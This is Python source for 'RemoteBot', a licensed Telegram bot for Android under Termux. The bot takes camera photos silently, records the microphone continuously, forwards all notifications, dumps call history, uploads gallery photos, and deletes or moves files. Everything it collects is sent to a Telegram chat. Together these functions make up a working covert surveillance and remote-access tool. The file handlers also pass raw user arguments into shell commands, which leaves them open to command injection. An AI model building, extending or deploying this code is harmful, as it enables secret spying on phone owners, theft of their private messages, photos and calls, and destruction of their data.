#!/usr/bin/env python3
"""
RemoteBot — Telegram Remote Control Bot
Created by Tech AHM YT
"""

import base64
import datetime
import getpass
import hashlib
import json
import os
import subprocess
import sys
import tempfile
import time                   # ✅ BUG FIX: time import যোগ করা হয়েছে
import urllib.request

# ═══════════════════════════════════════════════════════
# ⚠️  CREATOR PROTECTION — পরিবর্তন করবেন না
# ═══════════════════════════════════════════════════════
_CREATOR = "Tech AHM YT"
_SIG     = "546563682041484d205954"
CHANNEL  = "https://t.me/TECHAHMYT"

def _verify_creator():
    R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
    G = "\033[92m"; B = "\033[1m";  X = "\033[0m"
    if _CREATOR.encode().hex() != _SIG:
        msg = "Are You Copy Paster? 😏"
        print(f"\n{R}{B}", end="", flush=True)
        for ch in msg:
            print(ch, end="", flush=True)
            time.sleep(0.07)
        print(X)
        print(f"\n{R}{B}")
        print("  ╔══════════════════════════════════════════════╗")
        print("  ║        ❌  UNAUTHORIZED MODIFICATION!         ║")
        print("  ╠══════════════════════════════════════════════╣")
        print("  ║  😂 Creator নাম বদলে নিজের নাম দিয়েছো?     ║")
        print("  ║  এই tool টি শুধুমাত্র Tech AHM YT এর।       ║")
        print("  ║  চুরি করা ভালো না! 🚫                        ║")
        print("  ╠══════════════════════════════════════════════╣")
        print(f"  ║  {C}Original Channel : t.me/TECHAHMYT{R}          ║")
        print("  ╚══════════════════════════════════════════════╝")
        print(f"{X}")
        print(f"{Y}{B}  ⏳ Redirecting to original channel...{X}")
        for i in range(3, 0, -1):
            print(f"{Y}     {i}...{X}", flush=True)
            time.sleep(1)
        print(f"\n{G}{B}  🔗 Opening: {CHANNEL}{X}\n")
        os.system(f'termux-open-url "{CHANNEL}"')
        sys.exit(1)

_verify_creator()
# ═══════════════════════════════════════════════════════


# ═══════════════════════════════════════════════════════
# 🔑  LICENSE KEY SYSTEM
# ═══════════════════════════════════════════════════════

PRODUCT_NAME = "RemoteBot"

# ==========================================================
# GitHub RAW DATABASE URL
# ==========================================================

LICENSE_URL = (
    "https://raw.githubusercontent.com/"
    "techahm/RemoteBot-License-System/main/licenses.json"
)

# ==========================================================
# Public Key
# ==========================================================

PUBLIC_KEY_FILE = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "public_key.pem"
)


# ==========================================================
# Download licenses.json
# ==========================================================

def download_database():

    try:

        request = urllib.request.Request(
            LICENSE_URL,
            headers={
                "User-Agent": "RemoteBot-License-System"
            }
        )

        with urllib.request.urlopen(
            request,
            timeout=15
        ) as response:

            data = response.read().decode("utf-8")

        database = json.loads(data)

        if not isinstance(database, dict):
            return None

        if "licenses" not in database:
            return None

        if not isinstance(database["licenses"], list):
            return None

        return database

    except Exception as e:

        print(
            f"\n⚠️ License server error: {e}"
        )

        return None


# ==========================================================
# Constant-time string comparison
# ==========================================================

def secrets_compare(a, b):

    if not isinstance(a, str):
        return False

    if not isinstance(b, str):
        return False

    if len(a) != len(b):
        return False

    result = 0

    for x, y in zip(
        a.encode("utf-8"),
        b.encode("utf-8")
    ):

        result |= x ^ y

    return result == 0


# ==========================================================
# Verify RSA Signature
# ==========================================================

def verify_signature(payload):

    msg_file = None
    sig_file = None

    try:

        signature = base64.b64decode(
            payload["signature"],
            validate=True
        )

        unsigned = {
            "license_id": payload["license_id"],
            "username": payload["username"],
            "password_hash": payload["password_hash"],
            "salt": payload["salt"],
            "expiry": payload["expiry"],
            "product": payload["product"]
        }

        message = json.dumps(
            unsigned,
            sort_keys=True,
            separators=(",", ":")
        ).encode("utf-8")

        # Temporary message file
        with tempfile.NamedTemporaryFile(
            delete=False
        ) as f:

            f.write(message)
            msg_file = f.name

        # Temporary signature file
        sig_file = msg_file + ".sig"

        with open(
            sig_file,
            "wb"
        ) as f:

            f.write(signature)

        result = subprocess.run(
            [
                "openssl",
                "pkeyutl",
                "-verify",
                "-pubin",
                "-inkey",
                PUBLIC_KEY_FILE,
                "-rawin",
                "-in",
                msg_file,
                "-sigfile",
                sig_file
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        return result.returncode == 0

    except Exception:

        return False

    finally:

        # Cleanup temporary files
        if msg_file:

            try:
                os.remove(msg_file)
            except Exception:
                pass

        if sig_file:

            try:
                os.remove(sig_file)
            except Exception:
                pass


# ==========================================================
# Verify Username + Password
# ==========================================================

def verify_login(username, password):

    # ------------------------------------------------------
    # Check public key
    # ------------------------------------------------------

    if not os.path.exists(
        PUBLIC_KEY_FILE
    ):

        return (
            False,
            "public_key.pem not found."
        )

    # ------------------------------------------------------
    # Download database
    # ------------------------------------------------------

    database = download_database()

    if database is None:

        return (
            False,
            "Cannot connect to license server."
        )

    licenses = database.get(
        "licenses",
        []
    )

    # ------------------------------------------------------
    # Find username
    # ------------------------------------------------------

    record = None

    for item in licenses:

        if item.get("username") == username:

            record = item
            break

    if record is None:

        return (
            False,
            "Username not found."
        )

    # ------------------------------------------------------
    # Product check
    # ------------------------------------------------------

    if record.get("product") != PRODUCT_NAME:

        return (
            False,
            "Invalid product."
        )

    # ------------------------------------------------------
    # Signature check
    # ------------------------------------------------------

    if not verify_signature(record):

        return (
            False,
            "Invalid license signature."
        )

    # ------------------------------------------------------
    # Password check
    # ------------------------------------------------------

    try:

        salt = base64.b64decode(
            record["salt"]
        )

        calculated_hash = hashlib.pbkdf2_hmac(
            "sha256",
            password.encode("utf-8"),
            salt,
            200_000
        ).hex()

    except Exception:

        return (
            False,
            "Invalid password data."
        )

    if not secrets_compare(
        calculated_hash,
        record.get("password_hash", "")
    ):

        return (
            False,
            "Wrong password."
        )

    # ------------------------------------------------------
    # Expiry check
    # ------------------------------------------------------

    try:

        expiry = datetime.datetime.strptime(
            record["expiry"],
            "%Y-%m-%d"
        )

    except Exception:

        return (
            False,
            "Invalid expiry date."
        )

    # ------------------------------------------------------
    # Expired?
    # ------------------------------------------------------

    now = datetime.datetime.now()

    if now.date() > expiry.date():

        return (
            False,
            "License expired."
        )

    # ------------------------------------------------------
    # Remaining days
    # ------------------------------------------------------

    remaining_days = (
        expiry.date() - now.date()
    ).days

    # ------------------------------------------------------
    # Login successful
    # ------------------------------------------------------

    return True, {

        "license_id":
            record.get("license_id", ""),

        "username":
            record.get("username", ""),

        "expiry":
            record.get("expiry", ""),

        "remaining_days":
            remaining_days

    }


# ==========================================================
# Login Screen
# ==========================================================

def check_license():

    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    B = "\033[1m"
    X = "\033[0m"

    print(
        f"""
{Y}{B}
╔══════════════════════════════════════════╗
║             RemoteBot Login              ║
╚══════════════════════════════════════════╝
{X}
"""
    )

    # ------------------------------------------------------
    # Username
    # ------------------------------------------------------

    username = input(
        f"{Y}👤 Username: {X}"
    ).strip()

    if not username:

        print(
            f"{R}❌ Username required.{X}"
        )

        sys.exit(1)

    # ------------------------------------------------------
    # Password
    # ------------------------------------------------------

    # ✅ BUG FIX: getpass এখন উপরে import করা হয়েছে, এখানে আর লাগবে না
    password = getpass.getpass(
        f"{Y}🔐 Password: {X}"
    )

    if not password:

        print(
            f"{R}❌ Password required.{X}"
        )

        sys.exit(1)

    # ------------------------------------------------------
    # Verify
    # ------------------------------------------------------

    print(
        f"\n{Y}⏳ Verifying account...{X}"
    )

    valid, result = verify_login(
        username,
        password
    )

    # ------------------------------------------------------
    # Access denied
    # ------------------------------------------------------

    if not valid:

        print(
            f"""
{R}{B}
╔══════════════════════════════════════════╗
║             ❌ ACCESS DENIED             ║
╠══════════════════════════════════════════╣
║  {str(result):<38} ║
╚══════════════════════════════════════════╝
{X}
"""
        )

        sys.exit(1)

    # ------------------------------------------------------
    # Access granted
    # ------------------------------------------------------

    print(
        f"""
{G}{B}
╔══════════════════════════════════════════╗
║             ✅ ACCESS GRANTED            ║
╠══════════════════════════════════════════╣
║  👤 User: {result["username"]:<29} ║
║  📅 Expiry: {result["expiry"]:<27} ║
║  ⏳ Days: {result["remaining_days"]:<29} ║
╚══════════════════════════════════════════╝
{X}
"""
    )

    return True


# ═══════════════════════════════════════════════════════
# 🎨  STARTUP BANNER
# ═══════════════════════════════════════════════════════
def print_banner():
    C = "\033[96m"; G = "\033[92m"; Y = "\033[93m"
    R = "\033[91m"; B = "\033[1m";  X = "\033[0m"
    print(f"""
{C}{B}
 ██████╗ ███████╗███╗   ███╗ ██████╗ ████████╗███████╗
 ██╔══██╗██╔════╝████╗ ████║██╔═══██╗╚══██╔══╝██╔════╝
 ██████╔╝█████╗  ██╔████╔██║██║   ██║   ██║   █████╗
 ██╔══██╗██╔══╝  ██║╚██╔╝██║██║   ██║   ██║   ██╔══╝
 ██║  ██║███████╗██║ ╚═╝ ██║╚██████╔╝   ██║   ███████╗
 ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝   ╚═╝   ╚══════╝
{X}
{Y} ╔══════════════════════════════════════════════════╗{X}
{Y} ║{X}{G}{B}       🤖 Telegram Remote Control Bot           {X}{Y}║{X}
{Y} ╠══════════════════════════════════════════════════╣{X}
{Y} ║{X}{R}{B}           Created By  Tech AHM YT             {X}{Y}║{X}
{Y} ╠══════════════════════════════════════════════════╣{X}
{Y} ║{X}{G}  📢 Telegram : t.me/TECHAHMYT                   {X}{Y}║{X}
{Y} ║{X}{G}  ▶️  YouTube  : youtu.be/_pv3W4CXvwg             {X}{Y}║{X}
{Y} ╠══════════════════════════════════════════════════╣{X}
{Y} ║{X}{C}  🟢 Bot Starting...                              {X}{Y}║{X}
{Y} ╚══════════════════════════════════════════════════╝{X}
""")


# ==========================================================
# ✅ BUG FIX: সঠিক __main__ block
# ==========================================================

if __name__ == "__main__":
    check_license()   # ✅ সঠিক ফাংশন নাম (আগে _check_license() ছিল — ভুল)
    print_banner()    # ✅ লাইসেন্স চেকের পরে ব্যানার দেখাবে

# ═══════════════════════════════════════════════════════




# ... বাকি সব code হুবহু রাখো

CONFIG_FILE = os.path.expanduser("~/.remotebot_config.json")

# ═══════════════════════════════════════════
# প্রথমবার সেটআপ — Token ও Chat ID নেওয়া
# ═══════════════════════════════════════════
def save_config(token: str, chat_id: int):
    with open(CONFIG_FILE, "w") as f:
        json.dump({"token": token, "chat_id": chat_id}, f)

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return None, None
    try:
        data = json.load(open(CONFIG_FILE))
        return data["token"], int(data["chat_id"])
    except Exception:
        return None, None

def first_run_setup():
    print("\n" + "═" * 46)
    print("   🤖  RemoteBot — প্রথমবার সেটআপ")
    print("═" * 46)

    print("\n📌 Telegram Bot Token :")
    print("   (BotFather → /newbot telegram app)")
    token = input("   ➤ Token: ").strip()

    print("\n📌 আপনার Telegram Chat ID :")
    print("   (@userinfobot কে মেসেজ করলে পাবেন)")
    chat_str = input("   ➤ Chat ID: ").strip()

    try:
        chat_id = int(chat_str)
    except ValueError:
        print("❌ Chat ID অবশ্যই সংখ্যা হতে হবে!")
        sys.exit(1)

    if len(token) < 20 or ":" not in token:
        print("❌ Token সঠিক মনে হচ্ছে না!")
        sys.exit(1)

    save_config(token, chat_id)
    print(f"\n✅ সেটআপ সম্পন্ন! Config সেভ হয়েছে।")
    print(f"   Token  : {token[:10]}...{token[-5:]}")
    print(f"   Chat ID: {chat_id}")
    print("═" * 46 + "\n")
    return token, chat_id

# Config লোড করো, না থাকলে প্রথমবার সেটআপ করো
BOT_TOKEN, ALLOWED_ID = load_config()
if not BOT_TOKEN or not ALLOWED_ID:
    BOT_TOKEN, ALLOWED_ID = first_run_setup()

# ─────────────────────────────────────────
# IMPORTS
# ─────────────────────────────────────────
import subprocess, logging, glob, time, datetime, threading
import requests as req

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ─────────────────────────────────────────
# STARTUP NOTIFICATION
# ─────────────────────────────────────────
def send_startup_notification():
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hostname = os.uname().nodename

    msg = (
        "🟢 <b>Bot Active! — TECH_AHM </b>\n\n"
        f"🖥️ <b>Device:</b> {hostname}\n"
        f"🕐 <b>Time:</b> {now}\n"
        "✅ <b>Status:</b> Active & Ready\n"
        "👉 <b>Tap /start</b>"
    )

    try:
        req.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={
                "chat_id": ALLOWED_ID,
                "text": msg,
                "parse_mode": "HTML"
            },
            timeout=10
        )
    except Exception:
        pass


send_startup_notification()

logging.basicConfig(level=logging.CRITICAL)
HOME = os.path.expanduser("~")

# ─────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────
session = {"cwd": HOME}

def auth(update: Update) -> bool:
    return update.effective_chat.id == ALLOWED_ID

def shell(cmd: str, timeout=60, cwd=None) -> str:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True,
            text=True, timeout=timeout,
            cwd=cwd or session["cwd"]
        )
        return r.stdout.strip() or r.stderr.strip() or "Done (no output)"
    except subprocess.TimeoutExpired:
        return "Timeout!"
    except Exception as e:
        return f"Error: {e}"

# ─────────────────────────────────────────
# /start
# ─────────────────────────────────────────
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text(
        "🤖 Remote Control Bot ACTIVE\n"
        "  -- Created By Tech AHM YT --\n\n"
        "📊 SYSTEM:\n"
        "/battery     - Battery status\n"
        "/info        - Device info\n"
        "/storage     - Storage info\n"
        "/wifi        - WiFi info\n"
        "/ip          - IP address\n\n"
        "📸 MEDIA:\n"
        "/cam_front   - Front camera\n"
        "/cam_back    - Back camera\n"
        "/calls       - ৩ দিনের Call history\n"
        "/gallery     - Recent 10 photo\n"
        "/stop_gallery- Gallery বন্ধ\n\n"
        "⚙️ HARDWARE:\n"
        "/vibrate     - Vibrate\n"
        "/torch_on    - Torch ON\n"
        "/torch_off   - Torch OFF\n\n"
        "🔔 NOTIFICATION:\n"
        "/notifications - Active notifications\n"
        "/notif         - Auto forward চালু\n"
        "/stop_notif    - Auto forward বন্ধ\n\n"
        "🌐 OTHER:\n"
        "/notify [msg]  - Send notification\n"
        "/location      - GPS location\n"
        "/reset         - 🛑Config রিসেট করুন"
    )

# ─────────────────────────────────────────
# /reset — নতুন Token ও Chat ID সেট করতে
# ─────────────────────────────────────────
async def reset_config(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if os.path.exists(CONFIG_FILE):
        os.remove(CONFIG_FILE)
    await update.message.reply_text(
        "🗑️ Config মুছে গেছে!\n"
        "পরের বার bot চালু করলে নতুন Token ও Chat ID চাইবে।"
    )

# ─────────────────────────────────────────
# /battery
# ─────────────────────────────────────────
async def battery(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    result = shell("termux-battery-status")
    try:
        d = json.loads(result)
        await update.message.reply_text(
            f"🔋 Battery:\n"
            f"Level  : {d.get('percentage','N/A')}%\n"
            f"Status : {d.get('status','N/A')}\n"
            f"Health : {d.get('health','N/A')}\n"
            f"Temp   : {d.get('temperature','N/A')} °C\n"
            f"Plug   : {d.get('plugged','N/A')}"
        )
    except Exception:
        await update.message.reply_text(f"🔋 Battery:\n{result}")

# ─────────────────────────────────────────
# /info
# ─────────────────────────────────────────
async def info(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    cmds = {
        "Model"  : "getprop ro.product.model",
        "Brand"  : "getprop ro.product.brand",
        "Android": "getprop ro.build.version.release",
        "Uptime" : "uptime -p",
        "RAM"    : "free -m | grep Mem | awk '{print $2\" MB total / \"$3\" MB used\"}'",
    }
    msg = "📱 Device Info:\n"
    for k, c in cmds.items():
        r = subprocess.run(c, shell=True, capture_output=True, text=True)
        msg += f"{k:8}: {r.stdout.strip() or 'N/A'}\n"
    await update.message.reply_text(msg)

# ─────────────────────────────────────────
# /storage
# ─────────────────────────────────────────
async def storage(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    r = shell("df -h /storage/emulated/0 2>/dev/null || df -h ~")
    await update.message.reply_text(f"💾 Storage:\n{r}")

# ─────────────────────────────────────────
# /wifi
# ─────────────────────────────────────────
async def wifi(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    result = shell("termux-wifi-connectioninfo")
    try:
        d = json.loads(result)
        await update.message.reply_text(
            f"📶 WiFi Info:\n"
            f"SSID   : {d.get('ssid','N/A')}\n"
            f"IP     : {d.get('ip','N/A')}\n"
            f"Signal : {d.get('rssi','N/A')} dBm\n"
            f"Speed  : {d.get('link_speed','N/A')} Mbps"
        )
    except Exception:
        await update.message.reply_text(f"📶 WiFi:\n{result}")

# ─────────────────────────────────────────
# /ip
# ─────────────────────────────────────────
async def ip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    local  = shell(
        "ip addr show wlan0 2>/dev/null | grep 'inet ' | awk '{print $2}' || "
        "hostname -I 2>/dev/null | awk '{print $1}'"
    )
    public = shell("curl -s --max-time 10 ifconfig.me || curl -s --max-time 10 api.ipify.org")
    await update.message.reply_text(
        f"🌐 IP:\nLocal  : {local or 'N/A'}\nPublic : {public or 'N/A'}"
    )

# ─────────────────────────────────────────
# AUDIO RECORDING
# ─────────────────────────────────────────
audio_stop_event = threading.Event()
audio_stop_event.set()

async def audio(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not audio_stop_event.is_set():
        await update.message.reply_text("⚠️ Recording চলছে! বন্ধ করতে /stop_audio")
        return
    audio_stop_event.clear()
    chat_id = update.effective_chat.id
    await update.message.reply_text("🎙️ Recording শুরু! বন্ধ করতে /stop_audio")

    def record_loop():
        count = 1
        while not audio_stop_event.is_set():
            path = f"/storage/emulated/0/audio_{count}.mp3"
            os.system(f"termux-microphone-record -l 60 -f {path} > /dev/null 2>&1")
            os.system("termux-microphone-record -q > /dev/null 2>&1")

            # ✅ বাগ ২ ফিক্স: stop হলে partial ফাইল upload না করে মুছে বের হও
            if audio_stop_event.is_set():
                if os.path.exists(path):
                    os.remove(path)
                break

            if os.path.exists(path) and os.path.getsize(path) > 0:
                try:
                    # ✅ বাগ ১ ফিক্স: context manager দিয়ে ফাইল হ্যান্ডেল নিরাপদে বন্ধ করো
                    with open(path, "rb") as audio_file:
                        req.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendAudio",
                            data={"chat_id": chat_id, "title": f"Recording {count}"},
                            files={"audio": audio_file},
                            timeout=30
                        )
                except Exception:
                    pass
                finally:
                    # ✅ ফাইল হ্যান্ডেল বন্ধ হওয়ার পরেই delete, upload fail হলেও মুছবে
                    if os.path.exists(path):
                        os.remove(path)

            count += 1

    threading.Thread(target=record_loop, daemon=True).start()

async def stop_audio(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    audio_stop_event.set()
    os.system("termux-microphone-record -q > /dev/null 2>&1")
    await update.message.reply_text("🛑 Recording বন্ধ!")

# ─────────────────────────────────────────
# /calls
# ─────────────────────────────────────────
async def call_history(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    result = shell("termux-call-log -l 50")
    if "error" in result.lower() or not result:
        await update.message.reply_text("❌ Call history পাওয়া যায়নি!")
        return
    try:
        logs = json.loads(result)
        three_days_ago = datetime.datetime.now() - datetime.timedelta(days=3)
        recent = []
        for call in logs:
            try:
                if datetime.datetime.strptime(call["date"], "%Y-%m-%d %H:%M:%S") >= three_days_ago:
                    recent.append(call)
            except Exception:
                continue
        if not recent:
            await update.message.reply_text("📵 শেষ ৩ দিনে কোনো call নেই!")
            return
        emojis = {"INCOMING": "📲", "OUTGOING": "📤", "MISSED": "❌"}
        msg = "📞 <b>শেষ ৩ দিনের Call History:</b>\n\n"
        for call in recent[:30]:
            e    = emojis.get(call.get("type", ""), "📞")
            msg += (
                f"{e} <b>{call.get('name','Unknown')}</b>\n"
                f"   📱 {call.get('phone_number','N/A')}\n"
                f"   📅 {call.get('date','N/A')}\n"
                f"   ⏱️ {call.get('duration',0)} সেকেন্ড\n\n"
            )
        for i in range(0, len(msg), 4000):
            await update.message.reply_text(msg[i:i+4000], parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ─────────────────────────────────────────
# NOTIFICATION SYSTEM
# ─────────────────────────────────────────
notif_stop_event = threading.Event()
notif_stop_event.set()
last_notifs: set = set()
notif_lock = threading.Lock()

async def notifications(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    result = shell("termux-notification-list")
    if not result or "error" in result.lower():
        await update.message.reply_text(
            "❌ Notification পাওয়া যায়নি!\n"
            "Settings → Notification Access → Termux:API → ON করুন"
        )
        return
    try:
        notifs = json.loads(result)
        if not notifs:
            await update.message.reply_text("📭 কোনো notification নেই!")
            return
        msg = "🔔 <b>Active Notifications:</b>\n\n"
        for n in notifs[:20]:
            app   = n.get("packageName", "Unknown").split(".")[-1]
            title = n.get("title", "")
            text  = n.get("content", "")
            msg  += f"📱 <b>{app}</b>\n"
            if title: msg += f"   📌 {title}\n"
            if text:  msg += f"   💬 {text}\n"
            msg  += "\n"
        for i in range(0, len(msg), 4000):
            await update.message.reply_text(msg[i:i+4000], parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def start_notif_forward(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not notif_stop_event.is_set():
        await update.message.reply_text("⚠️ আগে থেকেই চলছে! বন্ধ করতে /stop_notif")
        return
    notif_stop_event.clear()
    chat_id = update.effective_chat.id
    await update.message.reply_text("🔔 Notification Forward চালু!\nবন্ধ করতে /stop_notif")

    def notif_loop():
        global last_notifs
        while not notif_stop_event.is_set():
            try:
                result = subprocess.run(
                    ["termux-notification-list"],
                    capture_output=True, text=True, timeout=15
                ).stdout.strip()
                if not result:
                    time.sleep(3); continue
                notifs  = json.loads(result)
                current = set()
                new_msgs = []
                for n in notifs:
                    nid = str(n.get("id","")) + n.get("packageName","") + str(n.get("title",""))
                    current.add(nid)
                    if nid not in last_notifs:          # নতুন notification
                        app   = n.get("packageName","Unknown").split(".")[-1]
                        title = n.get("title","")
                        text  = n.get("content","")
                        m     = f"🔔 <b>New Notification!</b>\n\n📱 <b>{app}</b>\n"
                        if title: m += f"📌 {title}\n"
                        if text:  m += f"💬 {text}"
                        new_msgs.append(m)
                for m in new_msgs:
                    try:
                        req.post(
                            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                            data={"chat_id": chat_id, "text": m, "parse_mode": "HTML"},
                            timeout=10
                        )
                    except Exception:
                        pass
                with notif_lock:
                    last_notifs = current
            except json.JSONDecodeError:
                pass
            except Exception:
                pass
            time.sleep(3)

    threading.Thread(target=notif_loop, daemon=True).start()

async def stop_notif(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    notif_stop_event.set()
    await update.message.reply_text("🛑 Notification Forward বন্ধ!")

# ─────────────────────────────────────────
# CAMERA
# ─────────────────────────────────────────
async def cam_front(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text("📸 Capturing front camera...")
    path = f"{HOME}/rc_front.jpg"
    if os.path.exists(path): os.remove(path)
    result = shell(f"termux-camera-photo -c 1 {path} 2>&1", timeout=30)
    if not os.path.exists(path):
        await update.message.reply_text(f"❌ Camera failed.\nDebug: {result}"); return
    try:
        await update.message.reply_photo(open(path, "rb"), caption="📸 Front Camera")
        os.remove(path)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")

async def cam_back(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text("📸 Capturing back camera...")
    path = f"{HOME}/rc_back.jpg"
    if os.path.exists(path): os.remove(path)
    result = shell(f"termux-camera-photo -c 0 {path} 2>&1", timeout=30)
    if not os.path.exists(path):
        await update.message.reply_text(f"❌ Camera failed.\nDebug: {result}"); return
    try:
        await update.message.reply_photo(open(path, "rb"), caption="📸 Back Camera")
        os.remove(path)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")

# ─────────────────────────────────────────
# GALLERY
# ─────────────────────────────────────────
gallery_stop_event = threading.Event()
gallery_stop_event.set()

async def gallery(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not gallery_stop_event.is_set():
        await update.message.reply_text("⚠️ Gallery চলছে! বন্ধ করতে /stop_gallery"); return
    gallery_stop_event.clear()
    photos = []
    for pattern in [
        "/storage/emulated/0/DCIM/**/*.jpg",
        "/storage/emulated/0/DCIM/**/*.jpeg",
        "/storage/emulated/0/DCIM/**/*.png",
        "/storage/emulated/0/Pictures/**/*.jpg",
    ]:
        photos.extend(glob.glob(pattern, recursive=True))
    if not photos:
        await update.message.reply_text("❌ কোনো ছবি পাওয়া যায়নি!")
        gallery_stop_event.set(); return
    photos.sort(key=os.path.getmtime, reverse=True)
    limit  = int(ctx.args[0]) if ctx.args else 10
    recent = photos[:limit]
    await update.message.reply_text(f"📸 {len(recent)}টি ছবি পাঠাচ্ছি...\nবন্ধ করতে /stop_gallery")
    for photo in recent:
        if gallery_stop_event.is_set():
            await update.message.reply_text("🛑 Gallery বন্ধ!"); return
        try:
            await update.message.reply_photo(open(photo, "rb"))
        except Exception:
            pass
    gallery_stop_event.set()
    await update.message.reply_text("✅ সব ছবি পাঠানো হয়েছে!")

async def stop_gallery(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    gallery_stop_event.set()
    await update.message.reply_text("🛑 Gallery বন্ধ!")

# ─────────────────────────────────────────
# HARDWARE
# ─────────────────────────────────────────
async def vibrate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("termux-vibrate -d 1000 -f")
    await update.message.reply_text("📳 Vibrating!")

async def torch_on(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("termux-torch on")
    await update.message.reply_text("🔦 Torch ON")

async def torch_off(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("termux-torch off")
    await update.message.reply_text("🔦 Torch OFF")

async def lock(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("input keyevent 26")
    await update.message.reply_text("🔒 Screen locked!")

# ─────────────────────────────────────────
# VOLUME
# ─────────────────────────────────────────
# ✅ State track করার জন্য global variable
is_muted = False

async def vol_up(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("input keyevent 24")
    await update.message.reply_text("🔊 Volume Up")

async def vol_down(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    shell("input keyevent 25")
    await update.message.reply_text("🔉 Volume Down")

async def mute(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global is_muted
    if not auth(update): return

    # ✅ ইতিমধ্যে muted থাকলে আর toggle করবে না
    if is_muted:
        await update.message.reply_text("🔇 ইতিমধ্যে Muted আছে!")
        return

    shell("input keyevent 164")
    is_muted = True
    await update.message.reply_text("🔇 Muted")

async def unmute(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global is_muted
    if not auth(update): return

    # ✅ ইতিমধ্যে unmuted থাকলে আর toggle করবে না
    if not is_muted:
        await update.message.reply_text("🔊 ইতিমধ্যে Unmuted আছে!")
        return

    shell("input keyevent 164")
    is_muted = False
    await update.message.reply_text("🔊 Unmuted")

# ─────────────────────────────────────────
# FILE MANAGEMENT
# ─────────────────────────────────────────
async def ls(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    path   = " ".join(ctx.args) if ctx.args else session["cwd"]
    result = shell(f"ls -lah {path} 2>&1")
    await update.message.reply_text(f"📁 {path}:\n{result[:4000]}")

async def cd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ Path দিন! /cd <path>"); return
    new_path = os.path.expanduser(" ".join(ctx.args))
    if not os.path.isdir(new_path):
        await update.message.reply_text(f"❌ Directory নেই: {new_path}"); return
    session["cwd"] = new_path
    await update.message.reply_text(f"📂 Changed to: {new_path}")

async def pwd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    await update.message.reply_text(f"📍 Current: {session['cwd']}")

async def mkdir(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ নাম দিন! /mkdir <name>"); return
    name = " ".join(ctx.args)
    shell(f"mkdir -p {name}")
    await update.message.reply_text(f"📁 Created: {name}")

async def touch(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ নাম দিন! /touch <name>"); return
    name = " ".join(ctx.args)
    shell(f"touch {name}")
    await update.message.reply_text(f"📄 Created: {name}")

async def rm(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if not ctx.args:
        await update.message.reply_text("❌ Path দিন! /rm <path>"); return
    path = " ".join(ctx.args)
    shell(f"rm -rf {path}")
    await update.message.reply_text(f"🗑️ Deleted: {path}")

async def mv(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if len(ctx.args) < 2:
        await update.message.reply_text("❌ /mv <src> <dst>"); return
    shell(f"mv {ctx.args[0]} {ctx.args[1]}")
    await update.message.reply_text(f"✅ Moved: {ctx.args[0]} → {ctx.args[1]}")

async def cp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not auth(update): return
    if len(ctx.args) < 2:
        await update.message.reply_text("❌ /cp <src> <dst>"); return
    shell(f"cp -r {ctx.args[0]} {ctx.args[1]}")
    await update.message.reply_text(f"✅ Copied: {ctx.args[0]} → {ctx.args[1]}")

